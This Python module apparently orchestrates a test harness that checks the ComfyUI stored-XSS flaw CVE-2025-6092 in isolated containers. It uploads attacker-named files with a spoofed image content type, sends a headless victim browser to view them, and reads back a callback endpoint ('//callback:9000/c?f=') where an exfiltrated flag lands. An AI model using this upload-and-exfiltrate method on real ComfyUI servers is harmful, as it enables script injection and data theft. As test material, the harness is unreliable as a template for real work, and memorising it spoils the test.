#!/usr/bin/env python3
"""Shared orchestration for the comfyui-cve-2025-6092 xss-exfil canary (REAL ComfyUI over HTTP).

One "probe" = (1) upload a file to the REAL ComfyUI `POST /upload/image` (multipart/form-data,
field "image", type=input), (2) reset the callback, (3) drive the headless victim to NAVIGATE to
that file's REAL `GET /view?filename=...&type=input` URL, (4) read the callback. The observable
result is the callback dump; the per-run ${PCB_FLAG} appears there IFF the REAL view_image()
handler served the file as a renderable type so the browser executed its embedded <script>
(proving execution, not reflection). No part of /view is re-implemented -- the real ComfyUI
aiohttp server decides the Content-Type / Content-Disposition.
"""
import os
import urllib.parse
import urllib.request

def _env_port(*keys: str) -> str:
    for k in keys:
        v = os.environ.get(k, "").strip()
        if v.isdigit():
            return v
    return ""


def _host(port: str, fallback: str) -> str:
    return f"http://127.0.0.1:{port}" if port else fallback


# Host-published ports. Prefer PCB_* / PORT_* from start.sh compose.env (randomized).
HOST_APP = {
    "v0": _host(_env_port("PCB_APP_PORT", "PORT_V0_0"), "http://127.0.0.1:33620"),
    "v1": _host(_env_port("PCB_APP_PORT", "PORT_V1_0"), "http://127.0.0.1:33621"),
    "v2": _host(_env_port("PCB_APP_PORT", "PORT_V2_0"), "http://127.0.0.1:33622"),
}
# Internal compose URLs the victim browser uses (Docker DNS by service name, real ComfyUI port).
INTERNAL_APP = {"v0": "http://v0:8188", "v1": "http://v1:8188", "v2": "http://v2:8188"}
VICTIM = _host(_env_port("PCB_VICTIM_PORT", "PORT_VICTIM_0"), "http://127.0.0.1:33670")
CALLBACK = _host(_env_port("PCB_CALLBACK_PORT", "PORT_CALLBACK_0"), "http://127.0.0.1:33690")

# Internal callback the exfil payload navigates to (protocol-relative -> resolves to http on the
# victim page, matching the app origin's scheme).
CB = '//callback:9000/c?f='


def _get(url, timeout=90):
    import os as _dbg
    if _dbg.environ.get("PCB_DEBUG_GET"):
        print("GET", url, file=_dbg.sys.stderr if hasattr(_dbg, "sys") else None, flush=True)
        import sys as _d2
        print("GET", url, file=_d2.stderr, flush=True)
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return r.read().decode("utf-8", "replace")
    except Exception:
        import sys as _d3
        print("GET_FAIL", url, file=_d3.stderr, flush=True)
        raise


def _upload(base_url: str, filename: str, content: bytes, part_ctype: str = "image/jpeg",
            timeout: int = 30) -> str:
    """multipart/form-data POST to the REAL ComfyUI /upload/image (field 'image', type=input).

    ComfyUI stores the uploaded bytes verbatim under the attacker-chosen filename in its input
    dir; it does not sanitise/convert the content. part_ctype is spoofed (image/jpeg) exactly as
    the public CVE-2025-6092 PoC does -- ComfyUI does not validate the part's content-type.
    overwrite=true keeps the filename stable across repeated probes.
    """
    boundary = "----pcbBOUNDARY7c9e2f1a"
    pre = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="image"; filename="{filename}"\r\n'
        f"Content-Type: {part_ctype}\r\n\r\n"
    ).encode()
    mid = (
        f"\r\n--{boundary}\r\n"
        f'Content-Disposition: form-data; name="type"\r\n\r\ninput\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="overwrite"\r\n\r\ntrue\r\n'
        f"--{boundary}--\r\n"
    ).encode()
    body = pre + content + mid
    req = urllib.request.Request(
        base_url + "/upload/image", data=body, method="POST",
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
    import time as _t
    for _attempt in range(5):
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return r.read().decode("utf-8", "replace")
        except (ConnectionResetError, ConnectionRefusedError, OSError) as e:
            if _attempt == 4:
                raise
            _t.sleep(3 * (_attempt + 1))
            req = urllib.request.Request(
                base_url + "/upload/image", data=body, method="POST",
                headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})


def run_payload(filename: str, content: str, version: str) -> str:
    """Upload `content` as `filename` to REAL /upload/image, drive the victim to REAL /view it on
    `version`, return the callback dump (flag present IFF /view served it as a renderable type)."""
    app = _host(_env_port("PCB_APP_PORT", f"PORT_{version.upper()}_0"), HOST_APP[version])
    victim = _host(_env_port("PCB_VICTIM_PORT", "PORT_VICTIM_0"), VICTIM)
    callback = _host(_env_port("PCB_CALLBACK_PORT", "PORT_CALLBACK_0"), CALLBACK)
    _upload(app, filename, content.encode("utf-8"))
    _get(callback + "/reset")
    view_url = INTERNAL_APP[version] + "/view?" + urllib.parse.urlencode(
        {"filename": filename, "type": "input"})
    q = urllib.parse.urlencode({"target": view_url, "origin": INTERNAL_APP[version] + "/"})
    _get(victim + "/visit?" + q)
    return _get(callback + "/dump")
